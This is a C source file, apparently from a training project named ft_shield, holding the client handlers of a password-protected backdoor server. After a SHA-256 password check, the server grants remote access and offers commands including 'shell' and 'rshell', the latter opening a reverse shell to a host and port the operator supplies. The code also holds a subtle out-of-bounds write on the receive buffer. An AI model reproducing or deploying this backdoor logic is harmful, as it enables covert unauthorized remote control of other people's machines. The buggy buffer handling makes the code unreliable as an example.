#include "../includes/ft_shield.h"
#include <arpa/inet.h>

void client_connection_handler(t_server* server) {
    struct sockaddr_in 	client_address;
	int len = sizeof(client_address);
	int new_client_socket;

    // clear client address 
	bzero(&client_address, sizeof(client_address));

    // accept new connection from client
	if ((new_client_socket = accept(server->socket, (struct sockaddr*)& client_address, (socklen_t*)& len)) < 0)
		return ;
    
    // handle connection if limit is not reached
    if (server->nb_connection < MAX_CLIENTS) {
	    // if accept function give a higher socket number to the new client, swap it with current max;
        if (new_client_socket > server->max_socket)
            server->max_socket = new_client_socket;

        FD_SET(new_client_socket, &server->fds_current);

        // search some place in clients array for register new client
        for (int i = 0 ; i < MAX_CLIENTS ; i++) {
            // space found, register new client socket
            if (server->clients[i].socket == -1) {
                server->clients[i].socket = new_client_socket;
                break ;
            }
        }

        // add new connection on the server and send password request to the new client
        server->nb_connection++;
        if (send(new_client_socket, ASK_KEYCODE, ASK_KEYCODE_LEN, 0) < 0)
            delete_client(server, new_client_socket);

    } else {
        // number of simultaneous connections reached
        send(new_client_socket, MAX_CLIENTS_ERR, MAX_CLIENT_ERR_LEN, 0);
        // close new socket
        shutdown(new_client_socket, SHUT_RDWR);
        close(new_client_socket);
    }
}


void client_authentication_handler(t_server* server, t_client* client, char* buf, size_t nbytes) {
    size_t  input_len;
    char    input[nbytes + 1];
    char    hash[PASSWORD_HASH_LEN];
        
    buf[nbytes + 1] = '\0';
    input_len = sizeof(input);

    // clear all buffer
    bzero(input, input_len);

    // fill input buffer with buf content
    strncpy(input, buf, input_len - 1);

    // hash input buffer with sha256 algorithm
    sha256(input, hash);

    // check if password is correct
    if (memcmp(hash, PASSWORD_HASH, SHA256_DIGEST_LENGTH) != 0) {       
        // if not, ask for password again
        if (send(client->socket, ASK_KEYCODE, ASK_KEYCODE_LEN, 0) < 0)
            delete_client(server, client->socket);

    } else {

        // password is correct, user is authenticated
        client->auth = true;

        // send prompt shell
        if (send(client->socket, SH_PROMPT, SH_PROMPT_LEN, 0) < 0)
            delete_client(server, client->socket);
    }
}

bool validate_rhost(char *rhost) {
    struct sockaddr_in sa;
    return (inet_pton(AF_INET, rhost, &(sa.sin_addr)) != 0) ? true : false;
}

bool validate_port(char *rport_str) {
    int port = atoi(rport_str);
    return (port > 0 && port < 65536) ? true : false;
}

bool validate_input(char *input, char **cmd, char **rhost, char **rport_str) {
    *cmd = strtok(input, " ");
    *rhost = strtok(NULL, " ");
    *rport_str = strtok(NULL, " ");
    
    if ((cmd && (rhost || rport_str)) && (strcmp(*cmd, "rshell") == 0)) {
        if (!validate_rhost(*rhost) || !validate_port(*rport_str))
            return (false);
    }

    return (true);
}

void add_log(char *buffer, size_t buffer_size, char* log) {
    size_t current_length = strlen(buffer);
    size_t message_length = strlen(log) + 1;

    if (current_length + message_length + 1 >= buffer_size) {
        // reset buffer ?
        return ;
    }

    
    strcat(buffer, log);
    strcat(buffer, "\n");
    
}

void client_command_handler(t_server* server, t_client* client, char* buf, size_t nbytes) {
    char    input[nbytes];
    size_t  input_len; 
    char*   cmd;
    char*   rhost;
    char*   rport_str;
        
    buf[nbytes] = '\0';
    input_len = sizeof(input);

    // clear all buffer
    bzero(input, input_len);

    // fill input buffer with buf content
    strncpy(input, buf, input_len - 1);

    // == press enter
    if (!input[0])
        goto PROMPT;
    
    // parse input for specific command
    if (!validate_input(input, &cmd, &rhost, &rport_str)) {
        if (send(client->socket, RSHELL_ERROR, RSHELL_ERROR_LEN, 0) < 0)
            delete_client(server, client->socket);
    } else {

        add_log(client->logs, sizeof(client->logs), input);

        // compare input client with existing commands
        if (!memcmp(cmd, "help", 4)) {
            if (send(client->socket, CMD_HELP, CMD_HELP_LEN, 0) < 0)
                delete_client(server, client->socket);
        }
        else if (!memcmp(cmd, "shell", 5))
            command_shell(server, client);
        else if (!memcmp(cmd, "rshell", 6))
            command_reverse_shell(server, client, rhost, rport_str);
        else if (!memcmp(cmd, "log", 3))
            command_log(server, client);
        else if (!memcmp(cmd, "exit", 4))
            delete_client(server, client->socket);
        else {
            // command does not exist
            if (send(client->socket, CMD_NOT_FOUND, CMD_NOT_FOUND_LEN, 0) < 0)
                delete_client(server, client->socket);
        }

    }

    PROMPT:
    // send prompt after each executed command
    if (send(client->socket, SH_PROMPT, SH_PROMPT_LEN, 0) < 0)
        delete_client(server, client->socket);
}